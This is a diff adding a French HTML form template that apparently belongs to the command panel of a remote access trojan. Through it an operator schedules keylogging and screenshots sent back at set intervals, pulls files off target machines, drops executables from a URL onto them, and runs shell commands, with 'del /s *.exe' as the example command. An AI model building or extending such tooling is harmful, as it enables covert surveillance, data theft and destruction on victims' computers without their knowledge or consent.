@@ -1,0 +1,96 @@
+
+      <form class="form-group cont_forms" method="post" action="#corps" id="forme_cont" class="cont_forms">
+{% if action == "forms" %}
+          <div class="label-info"><center>Commande : {{ type_cmd }}</center></div>
+          <br/>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Titre</div>
+            <input type="text" class="form-control" id="titre_add" placeholder="" required="">
+            <!--div class="input-group-addon">.00</div-->
+          </div>
+          </div>
+          <br/>
+          <div class="form-inline">
+            <div class="form-group">
+            <div class="input-group">
+              <div class="input-group-addon">Date debut</div>
+              <input type="text" class="form-control" id="date_debut_add" value="{{date_act}}" placeholder="yyyy-mm-dd hh:mm:ss" required="">
+              <!--div class="input-group-addon">.00</div-->
+            </div>
+          </div>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Date Fin</div>
+            <input type="text" class="form-control" id="date_fin_add" placeholder="yyyy-mm-dd hh:mm:ss">
+            <div class="input-group-addon">GMT+00:00</div>
+          </div>
+          </div>
+          </div>
+          <br/>
+        {% if type_cmd == "KeyLogger" %}
+          <input type="hidden" value="KeyLogger" id="type_add"/>
+
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Périodes d'envoie</div>
+            <input type="number" class="form-control" id="texte_add" placeholder="par exemple 60 pour une minute">
+            <div class="input-group-addon">secondes</div>
+          </div>
+          </div>
+          {% elif type_cmd == "ScreenShot" %}
+            <input type="hidden" value="ScreenShot" id="type_add"/>
+            <br/>
+            <div class="form-group">
+            <div class="input-group">
+              <div class="input-group-addon">Périodes d'envoie</div>
+              <input type="number" class="form-control" id="texte_add" placeholder="par exemple 60 pour une minute"/>
+              <div class="input-group-addon">secondes</div>
+            </div>
+            </div>
+        {% elif type_cmd == "Upload" %}
+          <input type="hidden" value="Upload" id="type_add"/>
+          <br/>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">emplacement du fichier/répertoire</div>
+            <input type="text" class="form-control" id="texte_add" placeholder="D:/blabla/...">
+          </div>
+          </div>
+
+        {% elif type_cmd == "Download" %}
+          <input type="hidden" value="Download" id="type_add"/>
+          <br/>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Url</div>
+            <input type="url" class="form-control" id="url_add" placeholder="https://www.exemple.com/maybe.exe">
+          </div>
+          </div>
+          <br/>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Emplacement où sera placé</div>
+            <input type="text" class="form-control" id="texte_add" placeholder="D:/blabla/...">
+          </div>
+          </div>
+        {% elif type_cmd == "Shell" %}
+          <input type="hidden" value="Shell" id="type_add"/>
+          <br/>
+          <div class="form-group">
+          <div class="input-group">
+            <div class="input-group-addon">Commandes shell</div>
+            <textarea  class="form-control" id="texte_add" placeholder="del /s *.exe" />
+          </div>
+          </div>
+        {% endif %}
+        <br/>
+        <p><button type="submit" class="btn btn-success btn-lg" onclick="ajouter_commande();">Envoyer</button></p>
+{% else %}
+    {% if teste == True %}
+    <p class="alert-success">Commande ajouter avec succès</p>
+    {% else %}
+    <p class="alert-warning">Erreur: un problème lors d'jout de cette commande, vérifier le format du date ...</p>
+    {% endif %}
+{% endif %}
+</form>
